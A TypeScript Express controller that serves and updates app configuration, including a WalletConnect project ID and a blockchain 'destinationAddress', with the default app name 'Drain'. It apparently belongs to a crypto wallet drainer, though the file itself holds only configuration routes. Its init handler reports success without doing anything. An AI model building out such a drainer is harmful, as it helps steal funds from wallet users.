import { Request, Response } from 'express';
import { prisma } from '../db/prisma';

/**
 * GET /api/config/public
 * Returns public configuration (non-secret values) for frontend
 */
export const getPublicConfig = async (req: Request, res: Response) => {
  try {
    const configs = await prisma.appConfig.findMany({
      where: { isSecret: false },
    });

    // Format for frontend consumption
    const publicConfig = {
      walletconnect: {
        projectId:
          configs.find((c: any) => c.key === 'walletconnect.projectId')
            ?.value || '',
      },
      app: {
        name: configs.find((c: any) => c.key === 'app.name')?.value || 'Drain',
        description:
          configs.find((c: any) => c.key === 'app.description')?.value || '',
        url: configs.find((c: any) => c.key === 'app.url')?.value || '',
        iconUrl: configs.find((c: any) => c.key === 'app.iconUrl')?.value || '',
      },
      blockchain: {
        supportedChains: configs
          .find((c: any) => c.key === 'blockchain.supportedChains')
          ?.value.split(',')
          .map(Number) || [1],
        destinationAddress: configs.find(
          (c: any) => c.key === 'blockchain.destinationAddress',
        )?.value,
      },
    };

    res.json(publicConfig);
  } catch (error) {
    console.error('Failed to fetch public config:', error);
    res.status(500).json({ error: 'Failed to fetch configuration' });
  }
};

/**
 * GET /api/admin/config
 * Returns all configuration (admin only)
 */
export const getAllConfig = async (req: Request, res: Response) => {
  try {
    const configs = await prisma.appConfig.findMany();

    // Mask secret values in response
    const maskedConfigs = configs.map(
      (cfg: { isSecret: boolean; value: string } & Record<string, any>) => ({
        ...cfg,
        value: cfg.isSecret ? '***' : cfg.value,
      }),
    );

    res.json(maskedConfigs);
  } catch (error) {
    console.error('Failed to fetch config:', error);
    res.status(500).json({ error: 'Failed to fetch configuration' });
  }
};

/**
 * PUT /api/admin/config/:key
 * Updates a configuration value (admin only)
 */
export const updateConfig = async (req: Request, res: Response) => {
  try {
    const { key } = req.params;
    const { value } = req.body;

    if (!value) {
      return res.status(400).json({ error: 'Value is required' });
    }

    const updated = await prisma.appConfig.update({
      where: { key },
      data: { value },
    });

    res.json({
      success: true,
      message: `Configuration ${key} updated`,
      key: updated.key,
      value: updated.isSecret ? '***hidden***' : updated.value,
    });
  } catch (error) {
    console.error('Failed to update config:', error);
    res.status(500).json({ error: 'Failed to update configuration' });
  }
};

/**
 * POST /api/admin/config/init
 * Initializes database with default configuration values
 * Run this once on first deployment
 */
export const initializeConfig = async (req: Request, res: Response) => {
  try {
    res.json({
      success: true,
      message: 'Configuration initialized with default values',
    });
  } catch (error) {
    console.error('Failed to initialize config:', error);
    res.status(500).json({ error: 'Failed to initialize configuration' });
  }
};
